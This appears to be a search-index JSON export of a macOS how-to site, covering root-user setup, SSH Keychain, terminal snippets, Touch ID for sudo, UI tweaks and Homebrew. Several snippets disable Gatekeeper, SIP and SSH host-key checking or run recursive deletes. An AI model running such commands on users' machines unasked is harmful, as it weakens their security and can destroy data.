Mac with an administrator account, you can enable the root user, then log in as the root user to complete your task.", "title": "Enable or Disable the Root User on macOS"}, {"location": "mac-os/enable-root-user/#how-to-enable-the-root-user", "text": "System Preferences > Users & Groups Click lock icon, enter an administrator name and password. Click Login Options . Click Join at Newotk Account Server . Click Open Directory Utility . Click lock icon in the Directory Utility window, then enter an administrator name and password. From the menu bar in Directory Utility: Choose Edit > Enable Root User, then enter the password that you want to use for the root user. Or choose Edit > Disable Root User.", "title": "How to Enable the Root User"}, {"location": "mac-os/enable-root-user/#how-to-disable-the-root-user", "text": "To Disable the Root User repeat the steps above, but change the last step to Disable Root User.", "title": "How to Disable the Root User"}, {"location": "mac-os/enable-root-user/#login-as-the-root-user", "text": "When the root user is enabled, you have the privileges of the root user only while logged in as the root user. Logout of your current account, then log in as the root user. user name \u201droot\u201d and the password you created for the root user.", "title": "Login as The Root User"}, {"location": "mac-os/import-ssh-keys-keychain/", "tags": ["template", "markdown"], "text": "Import ed25519/RSA Keys Passphrase to macOS Keychain \u00b6 First, you need to add the keys to the keychain with the following steps: Copy your ed25519, ed25519.pub / id_rsa, id_rsa.pub to ~/.ssh/ folder Store the key in the MacOS Keychain ed25519 Key RSA Key ssh-add --apple-use-keychain ~/.ssh/ed25519 ssh-add --apple-use-keychain ~/.ssh/id_rsa Enter your key passphrase. You won't be asked for it again. Configure SSH to always use the keychain \u00b6 If you haven't already, create an ~/.ssh/config file. In other words, in the .ssh directory in your home dir, make a file called config. At ~/.ssh/config file, add the following lines at the top of the config: Store the key in the MacOS Keychain For ed25519 Key For RSA Key Host * UseKeychain yes AddKeysToAgent yes IdentityFile ~/.ssh/id_ed25519 Host * UseKeychain yes AddKeysToAgent yes IdentityFile ~/.ssh/id_rsa The UseKeychain yes is the key part, which tells SSH to look in your macOS keychain for the key passphrase. That's it! Next time you load any ssh connection, it will try the private keys you've specified, and it will look for their passphrase in the macOS keychain. No passphrase typing required.", "title": "SSH Passphrase to Keychain"}, {"location": "mac-os/import-ssh-keys-keychain/#import-ed25519rsa-keys-passphrase-to-macos-keychain", "text": "First, you need to add the keys to the keychain with the following steps: Copy your ed25519, ed25519.pub / id_rsa, id_rsa.pub to ~/.ssh/ folder Store the key in the MacOS Keychain ed25519 Key RSA Key ssh-add --apple-use-keychain ~/.ssh/ed25519 ssh-add --apple-use-keychain ~/.ssh/id_rsa Enter your key passphrase. You won't be asked for it again.", "title": "Import ed25519/RSA Keys Passphrase to macOS Keychain"}, {"location": "mac-os/import-ssh-keys-keychain/#configure-ssh-to-always-use-the-keychain", "text": "If you haven't already, create an ~/.ssh/config file. In other words, in the .ssh directory in your home dir, make a file called config. At ~/.ssh/config file, add the following lines at the top of the config: Store the key in the MacOS Keychain For ed25519 Key For RSA Key Host * UseKeychain yes AddKeysToAgent yes IdentityFile ~/.ssh/id_ed25519 Host * UseKeychain yes AddKeysToAgent yes IdentityFile ~/.ssh/id_rsa The UseKeychain yes is the key part, which tells SSH to look in your macOS keychain for the key passphrase. That's it! Next time you load any ssh connection, it will try the private keys you've specified, and it will look for their passphrase in the macOS keychain. No passphrase typing required.", "title": "Configure SSH to always use the keychain"}, {"location": "mac-os/terminal-snippets/", "tags": ["template", "markdown"], "text": "Terminal Snippets \u00b6 Terminal usage snippets for macOS. This is a collection of snippets that I use without specific category. Install macOS Updates via CLI \u00b6 softwareupdate -i -a Install Command Line Tools \u00b6 xcode-select --install Shell Safe rm \u00b6 Source shell-safe-rm github A much safer replacement of shell rm with ALMOST FULL features of the origin rm command. Initially developed on Mac OS X, then tested on Linux. Using safe-rm , the files or directories you choose to remove will move to $HOME/.Trash instead of simply deleting them. You could put them back whenever you want manually. If a file or directory with the same name already exists in the Trash, the name of newly-deleted items will be ended with the current date and time. Install with npm: npm i -g safe-rm Add Alias to your zshrc config alias rm = 'safe-rm' Disable StrictHostKeyChecking in SSH \u00b6 To disable strict host checking on OS X for the current user, create or edit ~/.ssh/ssh_config and add the following lines: StrictHostKeyChecking no Set macOS Hostname via CLI \u00b6 sudo scutil --set HostName <NewHostNameHere> Syntax Highlighting for Nano \u00b6 Install Nano from homebrew Create ~/.nanorc file with the syntax below brew install nano touch ~/.nanorc Edit ~/.nanorc file with the syntax below M1 (ARM) Intel Based include /opt/homebrew/share/nano/asm.nanorc include /opt/homebrew/share/nano/autoconf.nanorc include /opt/homebrew/share/nano/awk.nanorc include /opt/homebrew/share/nano/c.nanorc include /opt/homebrew/share/nano/changelog.nanorc include /opt/homebrew/share/nano/cmake.nanorc include /opt/homebrew/share/nano/css.nanorc include /opt/homebrew/share/nano/debian.nanorc include /opt/homebrew/share/nano/default.nanorc include /opt/homebrew/share/nano/elisp.nanorc include /opt/homebrew/share/nano/fortran.nanorc include /opt/homebrew/share/nano/gentoo.nanorc include /opt/homebrew/share/nano/go.nanorc include /opt/homebrew/share/nano/groff.nanorc include /opt/homebrew/share/nano/guile.nanorc include /opt/homebrew/share/nano/html.nanorc include /opt/homebrew/share/nano/java.nanorc include /opt/homebrew/share/nano/javascript.nanorc include /opt/homebrew/share/nano/json.nanorc include /opt/homebrew/share/nano/lua.nanorc include /opt/homebrew/share/nano/makefile.nanorc include /opt/homebrew/share/nano/man.nanorc include /opt/homebrew/share/nano/mgp.nanorc include /opt/homebrew/share/nano/mutt.nanorc include /opt/homebrew/share/nano/nanohelp.nanorc include /opt/homebrew/share/nano/nanorc.nanorc include /opt/homebrew/share/nano/nftables.nanorc include /opt/homebrew/share/nano/objc.nanorc include /opt/homebrew/share/nano/ocaml.nanorc include /opt/homebrew/share/nano/patch.nanorc include /opt/homebrew/share/nano/perl.nanorc include /opt/homebrew/share/nano/php.nanorc include /opt/homebrew/share/nano/po.nanorc include /opt/homebrew/share/nano/postgresql.nanorc include /opt/homebrew/share/nano/pov.nanorc include /opt/homebrew/share/nano/python.nanorc include /opt/homebrew/share/nano/ruby.nanorc include /opt/homebrew/share/nano/rust.nanorc include /opt/homebrew/share/nano/sh.nanorc include /opt/homebrew/share/nano/spec.nanorc include /opt/homebrew/share/nano/tcl.nanorc include /opt/homebrew/share/nano/tex.nanorc include /opt/homebrew/share/nano/texinfo.nanorc include /opt/homebrew/share/nano/xml.nanorc ssh-add --apple-use-keychain ~/.ssh/id_rsa include /usr/local/share/nano/asm.nanorc include /usr/local/share/nano/autoconf.nanorc include /usr/local/share/nano/awk.nanorc include /usr/local/share/nano/c.nanorc include /usr/local/share/nano/changelog.nanorc include /usr/local/share/nano/cmake.nanorc include /usr/local/share/nano/css.nanorc include /usr/local/share/nano/debian.nanorc include /usr/local/share/nano/default.nanorc include /usr/local/share/nano/elisp.nanorc include /usr/local/share/nano/fortran.nanorc include /usr/local/share/nano/gentoo.nanorc include /usr/local/share/nano/go.nanorc include /usr/local/share/nano/groff.nanorc include /usr/local/share/nano/guile.nanorc include /usr/local/share/nano/html.nanorc include /usr/local/share/nano/java.nanorc include /usr/local/share/nano/javascript.nanorc include /usr/local/share/nano/json.nanorc include /usr/local/share/nano/lua.nanorc include /usr/local/share/nano/makefile.nanorc include /usr/local/share/nano/man.nanorc include /usr/local/share/nano/mgp.nanorc include /usr/local/share/nano/mutt.nanorc include /usr/local/share/nano/nanohelp.nanorc include /usr/local/share/nano/nanorc.nanorc include /usr/local/share/nano/nftables.nanorc include /usr/local/share/nano/objc.nanorc include /usr/local/share/nano/ocaml.nanorc include /usr/local/share/nano/patch.nanorc include /usr/local/share/nano/perl.nanorc include /usr/local/share/nano/php.nanorc include /usr/local/share/nano/po.nanorc include /usr/local/share/nano/postgresql.nanorc include /usr/local/share/nano/pov.nanorc include /usr/local/share/nano/python.nanorc include /usr/local/share/nano/ruby.nanorc include /usr/local/share/nano/rust.nanorc include /usr/local/share/nano/sh.nanorc include /usr/local/share/nano/spec.nanorc include /usr/local/share/nano/tcl.nanorc include /usr/local/share/nano/tex.nanorc include /usr/local/share/nano/texinfo.nanorc include /usr/local/share/nano/xml.nanorc Disable/Enable Gatekeeper \u00b6 Disable Gatekeeper sudo spctl --master-disable Enable Gatekeeper sudo spctl --master-enable Check Status spctl --status Disable/Enable SIP (System Integrity Protection) \u00b6 Reboot your Mac into Recovery Mode by restarting your computer and holding down Command+R until the Apple logo appears on your screen. Click Utilities > Terminal. In the Terminal window, type in: Status: csrutil status Disable: csrutil disable Enable: csrutil enable Press Enter and restart your Mac. Installing rbenv (ruby send box) - Ruby alternative to the one that macOS uses \u00b6 Install rbenv with brew brew install rbenv Add eval \"$(rbenv init -)\" to the end of ~/.zshrc or ~/.bash_profile Install a ruby version rbenv install 2 .3.1 Select a ruby version by rbenv rbenv global 2 .3.1 Open a new terminal window Verify that the right gem folder is being used with gem env home (should report something in your user folder not system wide) List listening Ports and Programs and Users (netstat like) \u00b6 sudo lsof -i -P | grep -i \"listen\" Disable \"last login\" at Terminal \u00b6 cd ~/ touch .hushlogin Fix Missing /Users/Shared Folder \u00b6 Create he missing /Users/Shared folder sudo mkdir -p /Users/Shared/ Fix permissions for the /Users/Shared folder sudo chmod -R 1777 /Users/Shared iTerm2 \u00b6 Using Alt/Cmd + Right/Left Arrow in iTerm2 Go to iTerm Preferences \u2192 Profiles , select your profile, then the Keys tab. click Load Preset ... and choose Natural Text Editing . Remove the Right Arrow Before the Cursor Line you can turn it off by going in to Preferences > Profiles > (your profile) > Terminal , scroll down to Shell Integration , and turn off Show mark indicators . Clear Google Drive cache \u00b6 rm -rf ~/Library/Application \\ Support/Google/DriveFS/ [ 0 -9 ] *", "title": "Terminal Snippets"}, {"location": "mac-os/terminal-snippets/#terminal-snippets", "text": "Terminal usage snippets for macOS. This is a collection of snippets that I use without specific category.", "title": "Terminal Snippets"}, {"location": "mac-os/terminal-snippets/#install-macos-updates-via-cli", "text": "softwareupdate -i -a", "title": "Install macOS Updates via CLI"}, {"location": "mac-os/terminal-snippets/#install-command-line-tools", "text": "xcode-select --install", "title": "Install Command Line Tools"}, {"location": "mac-os/terminal-snippets/#shell-safe-rm", "text": "Source shell-safe-rm github A much safer replacement of shell rm with ALMOST FULL features of the origin rm command. Initially developed on Mac OS X, then tested on Linux. Using safe-rm , the files or directories you choose to remove will move to $HOME/.Trash instead of simply deleting them. You could put them back whenever you want manually. If a file or directory with the same name already exists in the Trash, the name of newly-deleted items will be ended with the current date and time. Install with npm: npm i -g safe-rm Add Alias to your zshrc config alias rm = 'safe-rm'", "title": "Shell Safe rm"}, {"location": "mac-os/terminal-snippets/#disable-stricthostkeychecking-in-ssh", "text": "To disable strict host checking on OS X for the current user, create or edit ~/.ssh/ssh_config and add the following lines: StrictHostKeyChecking no", "title": "Disable StrictHostKeyChecking in SSH"}, {"location": "mac-os/terminal-snippets/#set-macos-hostname-via-cli", "text": "sudo scutil --set HostName <NewHostNameHere>", "title": "Set macOS Hostname via CLI"}, {"location": "mac-os/terminal-snippets/#syntax-highlighting-for-nano", "text": "Install Nano from homebrew Create ~/.nanorc file with the syntax below brew install nano touch ~/.nanorc Edit ~/.nanorc file with the syntax below M1 (ARM) Intel Based include /opt/homebrew/share/nano/asm.nanorc include /opt/homebrew/share/nano/autoconf.nanorc include /opt/homebrew/share/nano/awk.nanorc include /opt/homebrew/share/nano/c.nanorc include /opt/homebrew/share/nano/changelog.nanorc include /opt/homebrew/share/nano/cmake.nanorc include /opt/homebrew/share/nano/css.nanorc include /opt/homebrew/share/nano/debian.nanorc include /opt/homebrew/share/nano/default.nanorc include /opt/homebrew/share/nano/elisp.nanorc include /opt/homebrew/share/nano/fortran.nanorc include /opt/homebrew/share/nano/gentoo.nanorc include /opt/homebrew/share/nano/go.nanorc include /opt/homebrew/share/nano/groff.nanorc include /opt/homebrew/share/nano/guile.nanorc include /opt/homebrew/share/nano/html.nanorc include /opt/homebrew/share/nano/java.nanorc include /opt/homebrew/share/nano/javascript.nanorc include /opt/homebrew/share/nano/json.nanorc include /opt/homebrew/share/nano/lua.nanorc include /opt/homebrew/share/nano/makefile.nanorc include /opt/homebrew/share/nano/man.nanorc include /opt/homebrew/share/nano/mgp.nanorc include /opt/homebrew/share/nano/mutt.nanorc include /opt/homebrew/share/nano/nanohelp.nanorc include /opt/homebrew/share/nano/nanorc.nanorc include /opt/homebrew/share/nano/nftables.nanorc include /opt/homebrew/share/nano/objc.nanorc include /opt/homebrew/share/nano/ocaml.nanorc include /opt/homebrew/share/nano/patch.nanorc include /opt/homebrew/share/nano/perl.nanorc include /opt/homebrew/share/nano/php.nanorc include /opt/homebrew/share/nano/po.nanorc include /opt/homebrew/share/nano/postgresql.nanorc include /opt/homebrew/share/nano/pov.nanorc include /opt/homebrew/share/nano/python.nanorc include /opt/homebrew/share/nano/ruby.nanorc include /opt/homebrew/share/nano/rust.nanorc include /opt/homebrew/share/nano/sh.nanorc include /opt/homebrew/share/nano/spec.nanorc include /opt/homebrew/share/nano/tcl.nanorc include /opt/homebrew/share/nano/tex.nanorc include /opt/homebrew/share/nano/texinfo.nanorc include /opt/homebrew/share/nano/xml.nanorc ssh-add --apple-use-keychain ~/.ssh/id_rsa include /usr/local/share/nano/asm.nanorc include /usr/local/share/nano/autoconf.nanorc include /usr/local/share/nano/awk.nanorc include /usr/local/share/nano/c.nanorc include /usr/local/share/nano/changelog.nanorc include /usr/local/share/nano/cmake.nanorc include /usr/local/share/nano/css.nanorc include /usr/local/share/nano/debian.nanorc include /usr/local/share/nano/default.nanorc include /usr/local/share/nano/elisp.nanorc include /usr/local/share/nano/fortran.nanorc include /usr/local/share/nano/gentoo.nanorc include /usr/local/share/nano/go.nanorc include /usr/local/share/nano/groff.nanorc include /usr/local/share/nano/guile.nanorc include /usr/local/share/nano/html.nanorc include /usr/local/share/nano/java.nanorc include /usr/local/share/nano/javascript.nanorc include /usr/local/share/nano/json.nanorc include /usr/local/share/nano/lua.nanorc include /usr/local/share/nano/makefile.nanorc include /usr/local/share/nano/man.nanorc include /usr/local/share/nano/mgp.nanorc include /usr/local/share/nano/mutt.nanorc include /usr/local/share/nano/nanohelp.nanorc include /usr/local/share/nano/nanorc.nanorc include /usr/local/share/nano/nftables.nanorc include /usr/local/share/nano/objc.nanorc include /usr/local/share/nano/ocaml.nanorc include /usr/local/share/nano/patch.nanorc include /usr/local/share/nano/perl.nanorc include /usr/local/share/nano/php.nanorc include /usr/local/share/nano/po.nanorc include /usr/local/share/nano/postgresql.nanorc include /usr/local/share/nano/pov.nanorc include /usr/local/share/nano/python.nanorc include /usr/local/share/nano/ruby.nanorc include /usr/local/share/nano/rust.nanorc include /usr/local/share/nano/sh.nanorc include /usr/local/share/nano/spec.nanorc include /usr/local/share/nano/tcl.nanorc include /usr/local/share/nano/tex.nanorc include /usr/local/share/nano/texinfo.nanorc include /usr/local/share/nano/xml.nanorc", "title": "Syntax Highlighting for Nano"}, {"location": "mac-os/terminal-snippets/#disableenable-gatekeeper", "text": "Disable Gatekeeper sudo spctl --master-disable Enable Gatekeeper sudo spctl --master-enable Check Status spctl --status", "title": "Disable/Enable Gatekeeper"}, {"location": "mac-os/terminal-snippets/#disableenable-sip-system-integrity-protection", "text": "Reboot your Mac into Recovery Mode by restarting your computer and holding down Command+R until the Apple logo appears on your screen. Click Utilities > Terminal. In the Terminal window, type in: Status: csrutil status Disable: csrutil disable Enable: csrutil enable Press Enter and restart your Mac.", "title": "Disable/Enable SIP (System Integrity Protection)"}, {"location": "mac-os/terminal-snippets/#installing-rbenv-ruby-send-box-ruby-alternative-to-the-one-that-macos-uses", "text": "Install rbenv with brew brew install rbenv Add eval \"$(rbenv init -)\" to the end of ~/.zshrc or ~/.bash_profile Install a ruby version rbenv install 2 .3.1 Select a ruby version by rbenv rbenv global 2 .3.1 Open a new terminal window Verify that the right gem folder is being used with gem env home (should report something in your user folder not system wide)", "title": "Installing rbenv (ruby send box) - Ruby alternative to the one that macOS uses"}, {"location": "mac-os/terminal-snippets/#list-listening-ports-and-programs-and-users-netstat-like", "text": "sudo lsof -i -P | grep -i \"listen\"", "title": "List listening Ports and Programs and Users (netstat like)"}, {"location": "mac-os/terminal-snippets/#disable-last-login-at-terminal", "text": "cd ~/ touch .hushlogin", "title": "Disable \"last login\" at Terminal"}, {"location": "mac-os/terminal-snippets/#fix-missing-usersshared-folder", "text": "Create he missing /Users/Shared folder sudo mkdir -p /Users/Shared/ Fix permissions for the /Users/Shared folder sudo chmod -R 1777 /Users/Shared", "title": "Fix Missing /Users/Shared Folder"}, {"location": "mac-os/terminal-snippets/#iterm2", "text": "Using Alt/Cmd + Right/Left Arrow in iTerm2 Go to iTerm Preferences \u2192 Profiles , select your profile, then the Keys tab. click Load Preset ... and choose Natural Text Editing . Remove the Right Arrow Before the Cursor Line you can turn it off by going in to Preferences > Profiles > (your profile) > Terminal , scroll down to Shell Integration , and turn off Show mark indicators .", "title": "iTerm2"}, {"location": "mac-os/terminal-snippets/#clear-google-drive-cache", "text": "rm -rf ~/Library/Application \\ Support/Google/DriveFS/ [ 0 -9 ] *", "title": "Clear Google Drive cache"}, {"location": "mac-os/touch-id-for-sudo/", "tags": ["macOS", "iTerm2", "terminal", "touchID"], "text": "TouchID for sudo \u00b6 Apple devices such Macbooks and some Apple Magic Keyboards have a fingerprint - Touch ID scanner that can be used to authenticate a user with a touch of a finger. This functionality isn't available when using sudo to run commands. You have to enter your password every time you run commands with high privileges. We can enable TouchID for sudo with a simple config change. This will allow you to use Touch ID to authenticate with sudo without entering your password including the authentication with Apple Watch. Display Link - Known Issue As of the writing of this article, the Display Link Driver will privent the use of Touch ID for sudo when using the Display link device. It will work when the Display Link device isn't connected. This is a known issue. Enable TouchID for sudo \u00b6 Open in text editor file with sudo privileges /etc/pam.d/sudo . In the next example we will use the nano editor. sudo nano /etc/pam.d/sudo Add at the top of the config file this line: auth sufficient pam_tid.so Your config should look like this: Save and Exit. You can test your TouchID prompt in terminal by opening new session and running: sudo -l Enable TouchID Support in iTerm2 \u00b6 In order to enable TouchID support in iTerm2, you need to complete the above section and then follow the steps below: Go to iTerm2 -> Preferences -> Advanced and search for: Allow session to survive Change Allow session to survive logging out and back in. to No You can test your TouchID prompt in iTerm2 by opening new session and running: sudo -l", "title": "TouchID for sudo"}, {"location": "mac-os/touch-id-for-sudo/#touchid-for-sudo", "text": "Apple devices such Macbooks and some Apple Magic Keyboards have a fingerprint - Touch ID scanner that can be used to authenticate a user with a touch of a finger. This functionality isn't available when using sudo to run commands. You have to enter your password every time you run commands with high privileges. We can enable TouchID for sudo with a simple config change. This will allow you to use Touch ID to authenticate with sudo without entering your password including the authentication with Apple Watch. Display Link - Known Issue As of the writing of this article, the Display Link Driver will privent the use of Touch ID for sudo when using the Display link device. It will work when the Display Link device isn't connected. This is a known issue.", "title": "TouchID for sudo"}, {"location": "mac-os/touch-id-for-sudo/#enable-touchid-for-sudo", "text": "Open in text editor file with sudo privileges /etc/pam.d/sudo . In the next example we will use the nano editor. sudo nano /etc/pam.d/sudo Add at the top of the config file this line: auth sufficient pam_tid.so Your config should look like this: Save and Exit. You can test your TouchID prompt in terminal by opening new session and running: sudo -l", "title": "Enable TouchID for sudo"}, {"location": "mac-os/touch-id-for-sudo/#enable-touchid-support-in-iterm2", "text": "In order to enable TouchID support in iTerm2, you need to complete the above section and then follow the steps below: Go to iTerm2 -> Preferences -> Advanced and search for: Allow session to survive Change Allow session to survive logging out and back in. to No You can test your TouchID prompt in iTerm2 by opening new session and running: sudo -l", "title": "Enable TouchID Support in iTerm2"}, {"location": "mac-os/ui-tweaks/", "tags": ["macOS"], "text": "UI Tweaks \u00b6 Hide All The Icons On Your Desktop \u00b6 Disable Icons: defaults write com.apple.finder CreateDesktop false killall Finder Enable Icons: defaults write com.apple.finder CreateDesktop true killall Finder Change the Launchpad Grid Layout \u00b6 Change the springboard-columns and springboard-rows values according to your preference defaults write com.apple.dock springboard-columns -int 8 defaults write com.apple.dock springboard-rows -int 6 defaults write com.apple.dock ResetLaunchPad -bool TRUE killall Dock Reset Launchpad Icons Sort \u00b6 defaults write com.apple.dock ResetLaunchPad -bool true ; killall Dock Set the Same View Options for all Finder windows \u00b6 First, we want to set the default view options for all new Finder windows. To do so, open Finder and click on the view setting that you want to use. The settings are four icons and the top of your Finder window. If you don't see the Finder toolbar type: cmd + option + t After selecting the option you want, type: cmd + j to open the view options window. Make sure you check the top two checkboxes that say Always open in list view and Browse in list view. Keep in mind it will reflect whichever view you've selected. Now click the button at the bottom that says \"Use as Defaults\". Delete all .DS_Store files on your computer \u00b6 Chances are you've opened some Finder windows in the past. Individual folder options will override this default setting that we just set. In order reset your folder settings across the entire machine we have to delete all .DS_Store files. This will ensure that all folders start fresh. Open up the Terminal application (Applications/Utilities/Terminal), and type: sudo find / -name .DS_Store -delete 2 >/dev/null ; killall Finder Note: In the future, whenever you switch views, it will automatically save in the new .DS_Store file. This will override the default settings.", "title": "UI Tweaks"}, {"location": "mac-os/ui-tweaks/#ui-tweaks", "text": "", "title": "UI Tweaks"}, {"location": "mac-os/ui-tweaks/#hide-all-the-icons-on-your-desktop", "text": "Disable Icons: defaults write com.apple.finder CreateDesktop false killall Finder Enable Icons: defaults write com.apple.finder CreateDesktop true killall Finder", "title": "Hide All The Icons On Your Desktop"}, {"location": "mac-os/ui-tweaks/#change-the-launchpad-grid-layout", "text": "Change the springboard-columns and springboard-rows values according to your preference defaults write com.apple.dock springboard-columns -int 8 defaults write com.apple.dock springboard-rows -int 6 defaults write com.apple.dock ResetLaunchPad -bool TRUE killall Dock", "title": "Change the Launchpad Grid Layout"}, {"location": "mac-os/ui-tweaks/#reset-launchpad-icons-sort", "text": "defaults write com.apple.dock ResetLaunchPad -bool true ; killall Dock", "title": "Reset Launchpad Icons Sort"}, {"location": "mac-os/ui-tweaks/#set-the-same-view-options-for-all-finder-windows", "text": "First, we want to set the default view options for all new Finder windows. To do so, open Finder and click on the view setting that you want to use. The settings are four icons and the top of your Finder window. If you don't see the Finder toolbar type: cmd + option + t After selecting the option you want, type: cmd + j to open the view options window. Make sure you check the top two checkboxes that say Always open in list view and Browse in list view. Keep in mind it will reflect whichever view you've selected. Now click the button at the bottom that says \"Use as Defaults\".", "title": "Set the Same View Options for all Finder windows"}, {"location": "mac-os/ui-tweaks/#delete-all-ds_store-files-on-your-computer", "text": "Chances are you've opened some Finder windows in the past. Individual folder options will override this default setting that we just set. In order reset your folder settings across the entire machine we have to delete all .DS_Store files. This will ensure that all folders start fresh. Open up the Terminal application (Applications/Utilities/Terminal), and type: sudo find / -name .DS_Store -delete 2 >/dev/null ; killall Finder Note: In the future, whenever you switch views, it will automatically save in the new .DS_Store file. This will override the default settings.", "title": "Delete all .DS_Store files on your computer"}, {"location": "mac-os/homebrew/brewup/", "tags": ["macOS", "homebrew", "bash", "github"], "text": "BrewUp \u00b6 .md-typeset img { display: inline; Description \u00b6 Brewup script is a Bash script that uses Homebrew - The Missing Package Manager for macOS as it's base. Brewup uses GitHub as a \"backup\" of a config file which contains all installed Taps, Formulas, Casks and App Store Apps at your macOS. It also allows the use of Github main function of retaining changes so you can always look up for the package that were installed sometime ago and you just forgot what is was exactly. Visit as at 3os.org for more guides and tips for macOS What Brewup Actually Does \u00b6 It just runs few Brew functionality automatically: brew doctor brew missing brew upgrade brew cask upgrade brew cleanup App Store Updates Creating Updated Brewfile Pushing changes to Git Requirements \u00b6 Homebrew The missing package manager for macOS git (with active account) Mas, terminal-notifier, coreutils (will be installed if missing at the first script execution) Installing \u00b6 Use this repository as template, it will create a Fork for you and you can start using it. git clone <paste the your repo url here> sudo ln -s ${ PWD } /BrewUp/brewup.sh /usr/local/bin/brewup Note: if /usr/local/bin/ is missing create it with sudo mkdir /usr/local/bin/ Usage \u00b6 just run from terminal: brewup Install all apps from BrewFile: cd to local location you cloned your repository and run: brew bundle install --file = <BrewFile Name> License \u00b6 MIT License \u00b6 Copyright \u00a9 Stas Kosatuhin @2019 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "title": "BrewUp"}, {"location": "mac-os/homebrew/brewup/#brewup", "text": ".md-typeset img { display: inline;", "title": "BrewUp"}, {"location": "mac-os/homebrew/brewup/#description", "text": "Brewup script is a Bash script that uses Homebrew - The Missing Package Manager for macOS as it's base. Brewup uses GitHub as a \"backup\" of a config file which contains all installed Taps, Formulas, Casks and App Store Apps at your macOS. It also allows the use of Github main function of retaining changes so you can always look up for the package that were installed sometime ago and you just forgot what is was exactly. Visit as at 3os.org for more guides and tips for macOS", "title": "Description"}, {"location": "mac-os/homebrew/brewup/#what-brewup-actually-does", "text": "It just runs few Brew functionality automatically: brew doctor brew missing brew upgrade brew cask upgrade brew cleanup App Store Updates Creating Updated Brewfile Pushing changes to Git", "title": "What Brewup Actually Does"}, {"location": "mac-os/homebrew/brewup/#requirements", "text": "Homebrew The missing package manager for macOS git (with active account) Mas, terminal-notifier, coreutils (will be installed if missing at the first script execution)", "title": "Requirements"}, {"location": "mac-os/homebrew/brewup/#installing", "text": "Use this repository as template, it will create a Fork for you and you can start using it. git clone <paste the your repo url here> sudo ln -s ${ PWD } /BrewUp/brewup.sh /usr/local/bin/brewup Note: if /usr/local/bin/ is missing create it with sudo mkdir /usr/local/bin/", "title": "Installing"}, {"location": "mac-os/homebrew/brewup/#usage", "text": "just run from terminal: brewup Install all apps from BrewFile: cd to local location you cloned your repository and run: brew bundle install --file = <BrewFile Name>", "title": "Usage"}, {"location": "mac-os/homebrew/brewup/#license", "text": "", "title": "License"}, {"location": "mac-os/homebrew/brewup/#mit-license", "text": "Copyright \u00a9 Stas Kosatuhin @2019 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "title": "MIT License"}, {"location": "mac-os/homebrew/homebrew-snippets/", "tags": ["macOS", "homebrew"], "text": "Brew Snippets \u00b6 Brew Pinns - Freez and Unfreez Specific Packages \u00b6 This will alow you to pin (freez update) to specific packages to your Homebrew installation and then unfreeze them. List of packages that you freeze brew list --pinned Freeze Version brew pin <formula> Unfreeze Version brew unpin <formula> Uninstall Brew Package and Dependencies \u00b6 Remove package's dependencies (does not remove package): brew deps [ FORMULA ] | xargs brew remove --ignore-dependencies Remove package: brew remove [ FORMULA ] Reinstall missing libraries: brew missing | cut -d: -f2 | sort | uniq | xargs brew install", "title": "Brew Snippets"}, {"location": "mac-os/homebrew/homebrew-snippets/#brew-snippets", "text": "", "title": "Brew Snippets"}, {"location": "mac-os/homebrew/homebrew-snippets/#brew-pinns-freez-and-unfreez-specific-packages", "text": "This will alow you to pin (freez update) to specific packages to your Homebrew installation and then unfreeze them. List of packages that you freeze brew list --pinned Freeze Version brew pin <formula> Unfreeze Version brew unpin <formula>", "title": "Brew Pinns - Freez and Unfreez Specific Packages"}, {"location": "mac-os/homebrew/homebrew-snippets/#uninstall-brew-package-and-dependencies", "text": "Remove package's dependencies (does not remove package): brew deps [ FORMULA ] | xargs brew remove --ignore-dependencies Remove package: brew remove [ FORMULA ] Reinstall missing libraries: brew missing | cut -d: -f2 | sort | uniq | xargs brew install", "title": "Uninstall Brew Package and Dependencies"}, {"location": "mac-os/python/pyenv-virtualenv/", "tags": ["MacOS", "Python"], "text": "Pyenv-virtualenv - Multiple Version Python Virtual Environment Manager \u00b6 Intro \u00b6 Using and developing with Python on macOS sometimes may be frustrating... The reason for that is that macOS uses Python 2 for its core system with pip as a package manager. When Xcode Command Line Tools are installed Python 3 and pip3 package manager will be available at the cli. When using Python2, Python3 and their package managers this way, all the packages will be installed at the system level and my effect the native packages and their dependences , this can break or lead to unwanted bugs in OS. The right way to use python at macOS is to use Virtual Environments for python. This way all the system related versions of python and their packages won't be affected and use by you. Installing and configuring pyenv, pyenv-virtualenv \u00b6 In order to use pyenv, pyenv-virtualenv without conflicting with the native macOS python we need to add some configuration to our ~/.zshrc config (for mac os catalina) or your bash config if you are still using bash. It's very imported to maintain the order of the configuration for the loading order First of all we need to include your Executable Paths. In the example we added all the common paths, including the paths for pyenv, pyenv-virtualenv. If you have any other path that you use, you can add them at the same line or create a new line below this one. Second to Executable Paths we will add two if statements that will check if the pyenv,pyenv-virtualenv are installed, if they are it will load 